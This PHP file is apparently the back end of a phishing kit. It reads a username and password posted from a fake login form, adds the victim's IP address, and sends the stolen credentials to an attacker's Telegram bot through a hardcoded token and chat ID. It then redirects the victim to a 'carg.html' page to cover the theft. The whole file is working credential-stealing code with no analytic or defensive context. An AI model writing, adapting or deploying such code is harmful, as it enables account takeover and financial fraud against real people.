<?php

$token = "7985774212:AAGgWgjSn_AYArg1W4xpaVoBy-LpIqONE8Q";
$chat_id = "5157616506";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = isset($_POST['pp1']) ? htmlspecialchars($_POST['pp1']) : '';
    $contrasena = isset($_POST['pp2']) ? htmlspecialchars($_POST['pp2']) : '';
    $ip = $_SERVER['REMOTE_ADDR'];
    
    $mensaje = "🛑 AVanz:: acceso 🛑\n\n";
    $mensaje .= "👤 Usuario: $usuario\n";
    $mensaje .= "🔑 Contraseña: $contrasena\n";
    $mensaje .= "📍 IP: $ip\n";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $mensaje,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];
    $context  = stream_context_create($options);
    file_get_contents($url, false, $context);
    
    header("Location: carg.html");
    exit();
}
?>
